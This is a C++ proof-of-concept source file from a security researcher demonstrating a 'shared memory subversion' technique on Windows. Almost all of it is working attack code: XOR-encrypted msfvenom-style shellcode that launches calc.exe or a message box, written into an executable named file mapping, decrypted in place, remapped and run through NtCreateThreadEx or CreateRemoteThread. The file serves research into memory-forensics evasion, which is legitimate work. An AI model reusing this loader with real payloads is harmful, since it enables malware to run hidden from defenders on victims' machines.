// Proof of Concept for the shared memory subversion technique on Windows.
//
//   Copyright (c) 2020, Frank Block, ERNW Research GmbH <fblock@ernw.de>
//
//      All rights reserved.
//
//       Redistribution and use in source and binary forms, with or without modification,
//       are permitted provided that the following conditions are met:
//
//       * Redistributions of source code must retain the above copyright notice, this
//         list of conditions and the following disclaimer.
//       * Redistributions in binary form must reproduce the above copyright notice,
//         this list of conditions and the following disclaimer in the documentation
//         and/or other materials provided with the distribution.
//       * The names of the contributors may not be used to endorse or promote products
//         derived from this software without specific prior written permission.
//
//       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
//       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
//       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
//       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
//       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
//       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
//       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
//       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
//       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
//       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#include "stdafx.h"
#include "windows.h"
#include "iostream"
#include <wchar.h>
#include <stdio.h>

using namespace std;

typedef NTSTATUS(WINAPI *pNtCreateThreadEx)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN DWORD StackZeroBits,
	IN DWORD SizeOfStackCommit,
	IN DWORD SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
);

int sysError(){

	WCHAR sysMsg[256] = { NULL };

	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		sysMsg,
		256,
		NULL);

	wcout << "  FAILED WITH ERROR CODE: " << sysMsg << endl;

	return ERROR_CANCELLED;
}


int _tmain(int argc, wchar_t** argv)
{
	HANDLE hProcess = NULL;
	LPVOID memAddress = NULL;
	int wProcMem = 0;
	HANDLE threadID = NULL;
	bool bstatus = FALSE;
	int memsize = 0x2000;
	char key[] = "t0pSecr3t!";
	wchar_t* mapping_name = TEXT("hidden_shared_mem");
    int switchChar = 'c';

	if (argc > 1){
		mapping_name = argv[1];
	}

	wcout << "Mapping_name: " << mapping_name << endl;


#ifdef _M_AMD64
	wcout << "\nloading x86_64 shellcode\n";

	// calc.exe shellcode, generated with msfvenom ... as far as I remember. Sorry for any missing reference if it's taken from elsewhere.
    // Shellcode is xor encrypted with t0pSecr3t! and has the token string AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA  at the end
    // The encryption has only the purpose to prevent any accidental hit.
    // After loaded in memory, the shellcode and the token stay decrypted there.
	unsigned char shellcode[] =
		"\x88\x78\xf3\xb7\x95\x8b\xb2\x33\x74\x21\x35\x61\x31\x03\x37\x32"
        "\x24\x7b\x45\xf3\x11\x78\xfb\x01\x05\x2b\xf9\x61\x6c\x69\xff\x62"
        "\x50\x1b\xee\x11\x22\x7b\x7b\x96\x3e\x7a\x3d\x62\xac\x2b\x43\xf3"
        "\xd8\x1d\x15\x4c\x72\x7f\x45\x22\xb3\xfa\x79\x60\x75\xf1\x92\xbe"
        "\x37\x22\x23\x7b\xff\x73\x54\xbb\x32\x6f\x2d\x62\xa2\xb8\xf4\xa9"
        "\x74\x30\x70\x1b\xe0\xa3\x06\x54\x3c\x20\xa4\x60\xfb\x1b\x7d\x27"
        "\xf9\x73\x54\x68\x75\xe0\x93\x05\x2d\x9c\xbb\x72\xff\x15\xfc\x78"
        "\x71\x85\x28\x52\xbb\x7b\x45\xe1\xd8\x71\xb1\x9a\x68\x22\x73\xf2"
        "\x4c\xc1\x01\xc1\x3c\x50\x29\x47\x7a\x76\x4d\xf0\x01\xe8\x28\x17"
        "\xee\x23\x56\x7a\x75\xf1\x12\x71\xfb\x5f\x2d\x27\xf9\x73\x68\x68"
        "\x75\xe0\x31\xd8\x61\xeb\x3a\x32\xa4\x60\x2c\x71\x28\x0d\x3c\x39"
        "\x33\x6b\x35\x78\x35\x6a\x38\xd0\x89\x43\x33\x61\x8b\xc1\x2c\x71"
        "\x29\x09\x2d\xe8\x60\xda\x23\xde\x8b\xcf\x2d\x1b\xdf\x62\x72\x33"
        "\x74\x21\x74\x30\x70\x1b\xe8\xee\x73\x32\x74\x21\x35\x8a\x41\xd8"
        "\x0a\xe4\x8d\xe6\xcf\xd1\xc1\x92\x26\x12\xdf\xc5\xe7\x8e\xe9\xde"
        "\xa1\x78\xf3\x97\x4d\x5f\x74\x4f\x7e\xa1\x8f\xd0\x05\x56\xde\x24"
        "\x61\x41\x1b\x60\xfd\xea\x38\xd0\xa1\x43\xb1\x50\x15\x4d\x17\x1e"
        "\x15\x2b\x00\x63\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72"
        "\x35\x60\x35\x71\x31\x12\x3a\x14\x1a\x52\x00\x0f\x00\x58\x15\x7d"
        "\x00\x1a\x17\x40\x5a\x52\x11\x55\x5e\x32\x0b\x07\x5c\x47\x1c\x44"
        "\x5a\x55\x11\x21\x16\x4d\x1a\x56\x15\x53\x5a\x1e\x04\x3b\x00\x4d"
        "\x1f\x5a\x1a\x45\x5a\x52\x15\x3f\x0c\x06\x04\x56\x07\x7e\x35\x71"
        "\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72"
        "\x74";

#else
	wcout << "\nloading x86 shellcode\n";
	// MsgBox shellcode, generated with msfvenom ... as far as I remember. Sorry for any missing reference if it's taken from elsewhere.
    // Shellcode is xor encrypted with t0pSecr3t! and has the token string AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA  at the end
    // The encryption has only the purpose to prevent any accidental hit.
    // After loaded in memory, the shellcode and the token stay decrypted there.
	unsigned char shellcode[] =
        "\x9c\x7b\x71\x53\x65\xa0\xbe\xff\xb8\xed\xb8\xfc\xbc\x9f\xa9\xaf"
        "\x27\xb8\x98\xa2\x98\x38\x23\x05\x32\x0b\xf4\x64\x79\x21\x1c\xb8"
        "\x3e\x5e\x65\x8b\x68\x33\x74\x21\xfd\x75\x8c\x3b\x9f\xe8\x46\x33"
        "\x1c\xa9\x3a\x3d\x70\xbb\x6d\x63\x72\x33\xfd\x64\x8c\xd9\xc5\x53"
        "\x65\x63\x27\xb8\x98\x72\x22\x67\x21\x37\x9a\x56\x42\x33\x74\x21"
        "\x2c\xbb\x30\x5f\xee\x2b\x7e\xb8\x65\xaa\x35\x00\x1a\x51\xee\x1e"
        "\x7a\x64\x24\xc9\x2f\x30\x70\x53\xe0\xa3\x06\x37\xff\xeb\x9f\xd7"
        "\xfb\x12\x7d\x33\xf9\x6b\x48\x22\xb7\xbb\x28\x2b\x3d\x33\x71\xeb"
        "\xff\x6a\x68\xbb\x23\x73\xee\x38\x56\x30\xbc\x22\xa4\x33\xa8\xd8"
        "\x57\x3b\x22\x30\x84\x4b\x75\xcf\x05\x5f\x33\x8b\x51\x33\x74\x21"
        "\xf1\xf0\x04\x5b\xe6\xa1\x76\xb0\xb7\x23\x9f\xd3\x28\x60\xb7\x05"
        "\xf9\x20\xb5\xc3\x76\x33\xba\x50\x64\x3a\x2d\x6d\x2f\xaa\x91\x6d"
        "\xb2\x5b\x65\x36\xf9\xdf\x25\x72\x26\x03\xb9\x60\xbe\x50\xa0\xb8"
        "\x31\x29\xfe\x20\xf0\x99\x05\x60\xa8\xe2\x97\x22\x31\x20\xfa\x5b"
        "\xe1\xaa\x92\xdd\x47\xe1\xff\x7d\x7c\x68\xbc\x17\x73\x73\x2e\x7a"
        "\x2d\xbb\x95\x0e\xa7\x6f\x72\xb8\x31\x29\xff\x7d\x8c\xda\x6d\xe8"
        "\x27\x3f\xff\x64\x8c\xb9\x72\x0c\x3b\x38\xf9\xd6\x29\xe2\xb8\xfc"
        "\x25\xd8\x89\xe0\x9e\x3b\xb2\x64\x8c\x78\xb6\x16\x9c\x06\xb4\x76"
        "\x8e\x4d\xb2\x75\x8b\x3f\xa3\x26\x8e\x5c\xb2\x64\x89\x30\x1a\x53"
        "\xee\x26\x7a\xb0\xb4\x29\x24\xbd\x3d\xab\x34\x09\x72\xb8\x21\x29"
        "\xff\x72\x60\xac\xb5\xe8\x97\x6e\xb7\xed\xb8\xfc\xbc\x9f\xa9\xaf"
        "\x27\xb8\x98\xa2\x98\x18\xfd\x16\xb9\x33\xff\x7e\xac\x70\x9c\x9d"
        "\x8e\xac\x9a\xe0\xb6\x3b\xce\x20\x74\x30\x70\x38\xa7\x63\xb4\x77"
        "\x71\xc1\x74\xf6\x35\xab\x10\xa5\x37\xca\x07\xe7\x31\xca\x15\x95"
        "\x20\x98\x00\xf5\x31\xdd\x47\xf6\x35\xae\x57\xa5\x37\xcd\x74\xe7"
        "\x31\xdc\x3d\x95\x20\x8e\x17\xf5\x31\xcf\x07\xf6\x35\xbc\x16\xa5"
        "\x37\xc3\x15\xe7\x31\xc1\x17\x95\x20\x91\x17\xf5\x31\xd2\x36\xf6"
        "\x35\xa7\x0a\xa5\x37\xc6\x0c\xe7\x31\xc6\x31\x95\x20\x94\x72\xbe"
        "\x39\xd9\x25\xcf\x25\x8b\xec\x26\x96\xbe\x21\xcd\x26\xbb\x35\xb7"
        "\x35\x9c\x27\xef\xfd\x64\x9c\xbd\x3d\x8b\x34\x8b\x42\xcc\x8b\xde"
        "\xf7\xf4\x74\xd8\x80\x3e\xb1\xff\xb8\xed\xb8\xfc\xbc\x9f\xa9\xaf"
        "\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71"
        "\x31\x12\x3a\x14\x1a\x52\x00\x0f\x00\x58\x15\x7d\x00\x1a\x17\x40"
        "\x5a\x52\x11\x55\x5e\x32\x0b\x07\x5c\x47\x1c\x44\x5a\x55\x11\x21"
        "\x16\x4d\x1a\x56\x15\x53\x5a\x1e\x04\x3b\x00\x4d\x1f\x5a\x1a\x45"
        "\x5a\x52\x15\x3f\x0c\x06\x04\x56\x07\x7e\x35\x71\x31\x12\x24\x22"
        "\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72";

#endif

	hProcess = GetCurrentProcess();

	HANDLE lphMap = NULL;
	lphMap = INVALID_HANDLE_VALUE;

	wprintf(L"\nCreating file mapping...\n");
	lphMap = CreateFileMapping(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		memsize,
		mapping_name);

	if (lphMap == NULL) {
		wprintf(L"\nCreateFileMapping() failed with GetLastError() = %d", GetLastError());
		return ERROR_CANCELLED;
	}

	wprintf(L"\nFile mapping created.\n");

	memAddress = (LPBYTE)MapViewOfFile(
		lphMap,
		FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE,
		0,
		0,
		0);

	if (memAddress == NULL) {
		wprintf(L"\nMapViewOfFileEx() failed with GetLastError() = %d", GetLastError());
	}

	wprintf(L"\nView created at address %p.\n", memAddress);
	int shellcode_size = sizeof(shellcode);
	wProcMem = WriteProcessMemory(hProcess, memAddress, shellcode, shellcode_size, NULL);
	int i = 0;
	int keysize = sizeof(key) - 1;
	for (i = 0; i < shellcode_size; i++)
		((char*)memAddress)[i] = ((char*)memAddress)[i] ^ key[i%keysize];


	if (wProcMem == NULL){
		wcout << "\n  WARNING: WriteProcessMemory() ERROR!" << endl;
		sysError();
		return ERROR_CANCELLED;
	}

	wprintf(L"\nWritten %i bytes at address %p.\n", shellcode_size, memAddress);
#ifdef _DEBUG
	printf("\nThe hidden string is: %s\n", (char *)memAddress + (shellcode_size - 94));
#endif

	UnmapViewOfFile(memAddress);
	wcout << "View unmapped" << endl;
	wcout << "Press enter to start the loop..." << endl;
    while (getchar() != '\n');

	while (switchChar != L'q'){

		memAddress = (LPBYTE)MapViewOfFile(
			lphMap,
			FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE,
			0,
			0,
			0);

		if (memAddress == NULL) {
			wprintf(L"\nMapViewOfFileEx() failed with GetLastError() = %d", GetLastError());
		}

		wprintf(L"\nView remapped at address %p.\n", memAddress);
		wcout << "Press enter to start thread..." << endl;
        while (getchar() != '\n');
        
		// NtCreateThreadEx execution taken from https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/CodeInjection/NtCreateThreadEx.cpp
		HMODULE hNtdll;
		pNtCreateThreadEx NtCreateThreadEx = NULL;
		hNtdll = GetModuleHandle(_T("ntdll.dll"));
		// Get the address NtCreateThreadEx
#ifdef _DEBUG
		_tprintf(_T("\t[+] Looking for NtCreateThreadEx in ntdll\n"));
#endif
		NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
		if (NtCreateThreadEx == NULL) {
			wcout << "\n  WARNING: GetProcAddress() ERROR!" << endl;
			sysError();
			return FALSE;
		}
#ifdef _DEBUG
		_tprintf(_T("\t[+] Found at 0x%08x\n"), (UINT)NtCreateThreadEx);
#endif
		int status = 0;
        wcout << "\n  Trying to create thread with NtCreateThreadEx." << endl;
		status = NtCreateThreadEx(&threadID, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)memAddress, memAddress, FALSE, NULL, NULL, NULL, NULL);
		if (status < 0) {
			wcout << "\n  WARNING: NtCreateThreadEx() ERROR!" << endl;
			CloseHandle(threadID);
            wcout << "\n  Now trying CreateRemoteThread." << endl;
			threadID = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memAddress, NULL, 0, NULL);
			if (threadID == NULL){
				wcout << "\n  WARNING: CreateRemoteThread() ERROR!" << endl;
				sysError();
				CloseHandle(threadID);
				return ERROR_CANCELLED;
			}
			else wcout << "CreateThread SUCCESS :)" << endl;

		}
		else wcout << "NtCreateThreadEx SUCCESS :)" << endl;

		WaitForSingleObject(threadID, INFINITE);
		CloseHandle(threadID);

		wcout << "Press enter to unmap..." << endl;
        while (getchar() != '\n');
        
		UnmapViewOfFile(memAddress);
		wcout << "View unmapped" << endl;

		wcout << "Enter q to quit or anything else to restart the loop..." << endl;
		switchChar = getchar();
	}

	UnmapViewOfFile(memAddress);

	CloseHandle(lphMap);
	CloseHandle(threadID);
	CloseHandle(hProcess);

	return ERROR_SUCCESS;
}

